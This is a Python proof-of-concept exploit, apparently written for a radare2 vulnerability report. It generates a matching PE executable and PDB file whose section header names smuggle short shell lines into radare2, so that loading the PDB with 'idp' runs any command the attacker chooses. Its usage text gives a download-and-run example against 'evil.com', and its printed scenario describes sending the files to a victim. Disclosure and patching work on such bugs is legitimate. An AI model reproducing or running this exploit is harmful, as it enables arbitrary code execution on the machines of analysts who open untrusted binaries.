#!/usr/bin/env python3
"""
PoC: C-01 — Arbitrary RCE via Crafted PE + PDB
Technique: HITCON CTF 2017 "BabyFirst Revenge" + xxd hex decode

Generates BOTH a PE executable and a matching PDB file.
When the PE is opened in radare2 and `idp` (load PDB symbols) is run,
the crafted PDB executes an arbitrary shell command.

Usage:
    python3 poc_pdb_cmdinj_v2.py '<shell command>' [output_dir]

Example:
    python3 poc_pdb_cmdinj_v2.py 'curl http://evil.com/x|sh' /tmp
    # Creates /tmp/payload.exe and /tmp/payload.pdb
    # Victim: r2 /tmp/payload.exe -> idp -> command executes
"""

import struct
import sys
import os

PAGE_SIZE = 0x1000

# ─────────────────────────────────────────────
# PDB builder
# ─────────────────────────────────────────────

def build_pdb(commands, pdb_guid=b'\x00'*16, pdb_age=1):
    """Build a PDB7 file injecting the given command lines via section headers."""
    section_headers = []
    for cmd in commands:
        cmd_bytes = cmd.encode('ascii')
        name = b'\n' + cmd_bytes
        name = name.ljust(8, b'\x00')[:8]
        sctn = name
        sctn += struct.pack('<I', 0x1000)     # virtual_size
        sctn += struct.pack('<I', 0x1000)     # virtual_address
        sctn += struct.pack('<I', 0x200)      # size_of_raw_data
        sctn += struct.pack('<I', 0x200)      # pointer_to_raw_data
        sctn += struct.pack('<I', 0) * 2
        sctn += struct.pack('<H', 0) * 2
        sctn += struct.pack('<I', 0x60000020)
        section_headers.append(sctn)

    sym_records = b''
    for i in range(len(commands)):
        sym_name = f's{i}\x00'.encode('ascii')
        sym_body = struct.pack('<H', 0x110E) + struct.pack('<I', 2)
        sym_body += struct.pack('<I', 0x1000) + struct.pack('<H', i + 1)
        sym_body += sym_name
        sym_records += struct.pack('<H', len(sym_body)) + sym_body
    sym_records += struct.pack('<H', 0)

    SYMREC_IDX, SECTHDR_IDX = 4, 5
    s0 = b''

    # PDB info stream — must match the GUID/age in the PE's debug directory
    s1 = struct.pack('<I', 20000404)      # version VC70
    s1 += struct.pack('<I', 0x5F000000)   # timestamp
    s1 += struct.pack('<I', pdb_age)      # age
    s1 += pdb_guid                        # GUID (16 bytes)
    s1 += struct.pack('<I', 0)            # cb_names

    s2 = struct.pack('<I', 20040203) + struct.pack('<I', 56)
    s2 += struct.pack('<I', 0x1000) * 2 + struct.pack('<I', 0) + b'\x00' * 36

    s3 = struct.pack('<i', -1) + struct.pack('<I', 19990903) + struct.pack('<I', 1)
    s3 += struct.pack('<h', -1) + struct.pack('<H', 1) + struct.pack('<h', -1)
    s3 += struct.pack('<H', 0) + struct.pack('<h', SYMREC_IDX) + struct.pack('<H', 0)
    s3 += struct.pack('<I', 0) * 6 + struct.pack('<I', 22) + struct.pack('<I', 0)
    s3 += struct.pack('<H', 0) + struct.pack('<H', 0x8664) + struct.pack('<I', 0)
    s3 += struct.pack('<h', -1) * 5 + struct.pack('<h', SECTHDR_IDX) + struct.pack('<h', -1) * 5

    streams = [s0, s1, s2, s3, sym_records, b''.join(section_headers)]
    num_streams = len(streams)
    stream_sizes = [len(s) for s in streams]

    next_page = 5
    stream_pages = []
    for s in streams:
        if not s:
            stream_pages.append([])
        else:
            n = (len(s) + PAGE_SIZE - 1) // PAGE_SIZE
            stream_pages.append(list(range(next_page, next_page + n)))
            next_page += n

    root = struct.pack('<I', num_streams)
    for i, sz in enumerate(stream_sizes):
        root += struct.pack('<i', -1 if i == 0 else sz)
    for pages in stream_pages:
        for p in pages:
            root += struct.pack('<I', p)
    root = root.ljust(max(len(root), num_streams * 8 + 12), b'\x00')

    pdb = bytearray(next_page * PAGE_SIZE)
    hdr = b'Microsoft C/C++ MSF 7.00\r\n\x1ADS\x00\x00\x00'
    hdr += struct.pack('<IIIII', PAGE_SIZE, 1, next_page, len(root), 0)
    hdr += struct.pack('<I', 3)
    pdb[:len(hdr)] = hdr
    pdb[3*PAGE_SIZE:3*PAGE_SIZE+4] = struct.pack('<I', 4)
    pdb[4*PAGE_SIZE:4*PAGE_SIZE+len(root)] = root
    for i, s_data in enumerate(streams):
        if not s_data: continue
        for j, pn in enumerate(stream_pages[i]):
            cs = j * PAGE_SIZE
            pdb[pn*PAGE_SIZE:pn*PAGE_SIZE+min(PAGE_SIZE, len(s_data)-cs)] = s_data[cs:cs+PAGE_SIZE]
    return bytes(pdb)


# ─────────────────────────────────────────────
# PE builder (minimal x86_64 PE referencing PDB)
# ─────────────────────────────────────────────

def build_pe(pdb_filename, pdb_guid=b'\x00'*16, pdb_age=1):
    """Build a minimal PE64 that references the given PDB filename via RSDS CodeView."""

    # Constants
    IMAGE_FILE_MACHINE_AMD64 = 0x8664
    IMAGE_FILE_EXECUTABLE_IMAGE = 0x0002
    IMAGE_FILE_LARGE_ADDRESS_AWARE = 0x0020
    PE_OPT_MAGIC_PE32PLUS = 0x020b
    IMAGE_SUBSYSTEM_WINDOWS_CUI = 3
    IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE = 0x0040
    IMAGE_DLLCHARACTERISTICS_NX_COMPAT = 0x0100

    image_base = 0x140000000
    section_alignment = 0x1000
    file_alignment = 0x200
    header_size_aligned = 0x400  # aligned headers

    # .text section: just a RET instruction
    text_data = b'\xc3' + b'\xcc' * (file_alignment - 1)  # ret + int3 padding
    text_rva = section_alignment
    text_size = len(text_data)
    text_vsize = section_alignment

    # .rdata section: debug directory + RSDS CodeView record
    pdb_name_bytes = pdb_filename.encode('ascii') + b'\x00'

    # RSDS record: "RSDS" + GUID(16) + Age(4) + PDB_filename
    rsds = b'RSDS'
    rsds += pdb_guid
    rsds += struct.pack('<I', pdb_age)
    rsds += pdb_name_bytes

    # Debug directory entry (28 bytes): IMAGE_DEBUG_DIRECTORY
    #   Characteristics(4) TimeDateStamp(4) MajorVersion(2) MinorVersion(2)
    #   Type(4) SizeOfData(4) AddressOfRawData(4) PointerToRawData(4)
    rdata_rva = 2 * section_alignment
    rsds_rva_offset = 28  # RSDS comes after the debug dir entry within .rdata
    debug_dir = struct.pack('<I', 0)             # Characteristics
    debug_dir += struct.pack('<I', 0x5F000000)   # TimeDateStamp
    debug_dir += struct.pack('<HH', 0, 0)        # Major/MinorVersion
    debug_dir += struct.pack('<I', 2)            # Type = IMAGE_DEBUG_TYPE_CODEVIEW
    debug_dir += struct.pack('<I', len(rsds))    # SizeOfData
    debug_dir += struct.pack('<I', rdata_rva + rsds_rva_offset)  # AddressOfRawData (RVA)
    debug_dir += struct.pack('<I', header_size_aligned + text_size + rsds_rva_offset)  # PointerToRawData (file offset)

    rdata_data = debug_dir + rsds
    rdata_data = rdata_data.ljust(file_alignment, b'\x00')
    rdata_vsize = section_alignment

    num_sections = 2  # .text, .rdata
    size_of_image = (num_sections + 1) * section_alignment

    # ── COFF File Header (20 bytes) ──
    coff_hdr = struct.pack('<H', IMAGE_FILE_MACHINE_AMD64)
    coff_hdr += struct.pack('<H', num_sections)
    coff_hdr += struct.pack('<I', 0x5F000000)  # TimeDateStamp
    coff_hdr += struct.pack('<I', 0)           # PointerToSymbolTable
    coff_hdr += struct.pack('<I', 0)           # NumberOfSymbols
    coff_hdr += struct.pack('<H', 240)         # SizeOfOptionalHeader (PE32+ = 240 for 16 data dirs)
    coff_hdr += struct.pack('<H', IMAGE_FILE_EXECUTABLE_IMAGE | IMAGE_FILE_LARGE_ADDRESS_AWARE)

    # ── Optional Header (PE32+) ──
    opt = struct.pack('<H', PE_OPT_MAGIC_PE32PLUS)
    opt += struct.pack('<BB', 14, 0)           # Linker version
    opt += struct.pack('<I', text_size)         # SizeOfCode
    opt += struct.pack('<I', len(rdata_data))   # SizeOfInitializedData
    opt += struct.pack('<I', 0)                # SizeOfUninitializedData
    opt += struct.pack('<I', text_rva)          # AddressOfEntryPoint
    opt += struct.pack('<I', text_rva)          # BaseOfCode
    opt += struct.pack('<Q', image_base)        # ImageBase
    opt += struct.pack('<I', section_alignment)
    opt += struct.pack('<I', file_alignment)
    opt += struct.pack('<HH', 6, 0)            # OS version
    opt += struct.pack('<HH', 0, 0)            # Image version
    opt += struct.pack('<HH', 6, 0)            # Subsystem version
    opt += struct.pack('<I', 0)                # Win32VersionValue
    opt += struct.pack('<I', size_of_image)     # SizeOfImage
    opt += struct.pack('<I', header_size_aligned)  # SizeOfHeaders
    opt += struct.pack('<I', 0)                # CheckSum
    opt += struct.pack('<H', IMAGE_SUBSYSTEM_WINDOWS_CUI)
    opt += struct.pack('<H', IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE | IMAGE_DLLCHARACTERISTICS_NX_COMPAT)
    opt += struct.pack('<Q', 0x100000)          # SizeOfStackReserve
    opt += struct.pack('<Q', 0x1000)            # SizeOfStackCommit
    opt += struct.pack('<Q', 0x100000)          # SizeOfHeapReserve
    opt += struct.pack('<Q', 0x1000)            # SizeOfHeapCommit
    opt += struct.pack('<I', 0)                # LoaderFlags
    opt += struct.pack('<I', 16)               # NumberOfRvaAndSizes

    # Data directories (16 entries, each 8 bytes: RVA + Size)
    data_dirs = b'\x00' * 8 * 6  # entries 0-5 empty
    # Entry 6: Debug directory
    data_dirs += struct.pack('<II', rdata_rva, 28)  # RVA of debug dir, size=28
    data_dirs += b'\x00' * 8 * 9  # entries 7-15 empty

    opt += data_dirs

    # ── Section Headers ──
    # .text
    text_hdr = b'.text\x00\x00\x00'
    text_hdr += struct.pack('<I', text_vsize)
    text_hdr += struct.pack('<I', text_rva)
    text_hdr += struct.pack('<I', text_size)
    text_hdr += struct.pack('<I', header_size_aligned)  # PointerToRawData
    text_hdr += struct.pack('<I', 0) * 2  # reloc/linenum ptrs
    text_hdr += struct.pack('<H', 0) * 2  # reloc/linenum counts
    text_hdr += struct.pack('<I', 0x60000020)  # CODE|EXECUTE|READ

    # .rdata
    rdata_hdr = b'.rdata\x00\x00'
    rdata_hdr += struct.pack('<I', rdata_vsize)
    rdata_hdr += struct.pack('<I', rdata_rva)
    rdata_hdr += struct.pack('<I', len(rdata_data))
    rdata_hdr += struct.pack('<I', header_size_aligned + text_size)  # PointerToRawData
    rdata_hdr += struct.pack('<I', 0) * 2
    rdata_hdr += struct.pack('<H', 0) * 2
    rdata_hdr += struct.pack('<I', 0x40000040)  # INITIALIZED_DATA|READ

    # ── Assemble PE ──
    dos_header = bytearray(64)
    dos_header[0:2] = b'MZ'
    struct.pack_into('<I', dos_header, 60, 64)  # e_lfanew = 64

    pe_sig = b'PE\x00\x00'

    headers = bytes(dos_header) + pe_sig + coff_hdr + opt + text_hdr + rdata_hdr
    headers = headers.ljust(header_size_aligned, b'\x00')

    pe = headers + text_data + rdata_data
    return pe


# ─────────────────────────────────────────────
# BabyFirst + xxd payload generator
# ─────────────────────────────────────────────

def cmd_to_babyfirst_lines(target_cmd):
    """Convert arbitrary shell command to injected r2 lines (each ≤ 7 chars)."""
    # Append cleanup to the command itself — rm the workspace after execution
    full_cmd = target_cmd + ';rm -rf /tmp/q'
    hex_cmd = full_cmd.encode().hex()
    chunks = [hex_cmd[i:i+4] for i in range(0, len(hex_cmd), 4)]

    lines = []
    lines.append('cd /tmp')   # 7c
    lines.append('mkdir q')   # 7c
    lines.append('cd q')      # 4c

    for chunk in chunks:
        lines.append(f'!>{chunk}')
        lines.append('!ls>>y')
        lines.append(f'!rm {chunk[0]}*')

    lines.append('!>-r')
    lines.append('!>-p')
    lines.append('!>z')
    lines.append('!xxd *')
    lines.append('!sh z')

    for i, l in enumerate(lines):
        assert len(l) <= 7, f'Line {i} too long: {l!r} ({len(l)}c)'

    return lines


# ─────────────────────────────────────────────
# Main
# ─────────────────────────────────────────────

def main():
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} '<shell command>' [output_dir]")
        print(f"\nGenerates payload.exe + payload.pdb in output_dir (default /tmp)")
        print(f"\nExample:")
        print(f"  {sys.argv[0]} 'id > /tmp/pwned'")
        print(f"  r2 /tmp/payload.exe")
        print(f"  > idp /tmp/payload.pdb    # triggers command execution")
        return

    target_cmd = sys.argv[1]
    out_dir = sys.argv[2] if len(sys.argv) > 2 else '/tmp'

    pdb_path = os.path.join(out_dir, 'payload.pdb')
    pe_path = os.path.join(out_dir, 'payload.exe')

    # Shared GUID/age for PE <-> PDB matching
    pdb_guid = b'\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50'
    pdb_age = 1

    print(f"[*] Target command: {target_cmd}")
    print(f"[*] Hex: {target_cmd.encode().hex()}")

    # Generate payload lines
    lines = cmd_to_babyfirst_lines(target_cmd)
    print(f"[+] Payload: {len(lines)} injected lines")

    # Build PDB
    pdb_data = build_pdb(lines, pdb_guid=pdb_guid, pdb_age=pdb_age)
    with open(pdb_path, 'wb') as f:
        f.write(pdb_data)
    print(f"[+] PDB: {pdb_path} ({len(pdb_data)} bytes)")

    # Build PE referencing the PDB
    pe_data = build_pe(os.path.basename(pdb_path), pdb_guid=pdb_guid, pdb_age=pdb_age)
    with open(pe_path, 'wb') as f:
        f.write(pe_data)
    print(f"[+] PE:  {pe_path} ({len(pe_data)} bytes)")

    print()
    print(f"[*] Attack scenario:")
    print(f"    1. Attacker sends payload.exe + payload.pdb to victim")
    print(f"    2. Victim opens in r2:  r2 {pe_path}")
    print(f"    3. Victim loads PDB:    idp {pdb_path}")
    print(f"    4. Shell command executes: {target_cmd}")
    print()
    print(f"[*] Quick test:")
    print(f"    r2 -qc 'idp {pdb_path}' {pe_path}")


if __name__ == '__main__':
    main()
